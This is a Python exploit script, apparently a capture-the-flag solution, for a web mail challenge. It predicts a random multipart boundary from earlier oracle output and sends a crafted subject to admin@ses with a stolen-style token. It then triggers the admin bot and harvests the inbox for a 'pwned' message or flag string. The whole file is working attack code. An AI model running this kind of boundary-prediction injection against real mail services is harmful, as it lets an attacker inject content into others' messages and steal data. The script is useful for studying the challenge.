"""Second attempt on the SAME live instance (alignment already known from the oracle):
send the exploit mail, then two bot runs, then harvest.

B1 (reply's inner multipart boundary) = preds[kB1] where the next random call index
is known from the self-send oracle.
"""
import sys, os, json, re, time, http.client
from urllib.parse import urlparse

sys.path.insert(0, r'.')
from _z_496_spec import make_D, make_subj, PWN

BASE = sys.argv[1].rstrip('/')
KB1 = int(sys.argv[2])           # index in preds of the reply's inner boundary

u = urlparse(BASE)
conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=60)


def req(method, path, obj=None, token=None):
    global conn
    last = None
    for attempt in range(4):
        try:
            body = json.dumps(obj) if obj is not None else None
            hdrs = {}
            if body is not None:
                hdrs['Content-Type'] = 'application/json'
            if token:
                hdrs['token'] = token
            conn.request(method, path, body=body, headers=hdrs)
            r = conn.getresponse()
            d = r.read().decode()
            if r.status >= 400:
                raise RuntimeError('%s %s -> %s %s' % (method, path, r.status, d[:200]))
            return json.loads(d)
        except (http.client.HTTPException, ConnectionError, OSError) as e:
            last = e
            conn.close()
            conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=60)
            time.sleep(0.2)
    raise last


cfg = json.load(open(r'./_z_496_remote.json'))
tok = cfg['tok']
preds = json.load(open(r'./_z_496_pred.json'))
print('[i] preds:')
for i, p in enumerate(preds):
    print('   [%d] %d' % (i, p))

B1 = '=' * 15 + ('%019d' % preds[KB1]) + '=='
print('[i] crafting exploit with B1 = preds[%d] = %s' % (KB1, B1))
subj = make_subj(B1)
eid = req('POST', '/api/send', {'to': 'admin@ses', 'subject': subj, 'body': 'hello'}, tok)
print('[i] exploit mail sent id=%s (consumed expect preds[%d])' % (eid, KB1 - 2))
json.dump({'base': BASE, 'tok': tok, 'B1': B1, 'eid': eid}, open(r'./_z_496_state.json', 'w'))

for run in (1, 2):
    t0 = time.time()
    print('[i] bot run %d ->' % run, req('POST', '/api/admin_bot', None, tok),
          '%.1fs' % (time.time() - t0), flush=True)
    time.sleep(1)

for attempt in range(8):
    emails = req('GET', '/api/emails', None, tok)
    hits = []
    for k, e in emails.items():
        d = e['data']
        if re.search(r'(?mi)^Subject: pwned', d) or re.search(r'[A-Za-z0-9_]{2,}\{[^}]{6,}\}', d):
            hits.append((e['time'], k, d))
    hits.sort()
    if hits:
        for t, k, d in hits:
            print('=== HIT', k, '===')
            print(d[:2500])
        sys.exit(0)
    print('[i] harvest retry %d inbox=%d' % (attempt, len(emails)), flush=True)
    time.sleep(3)
print('[-] no flag')
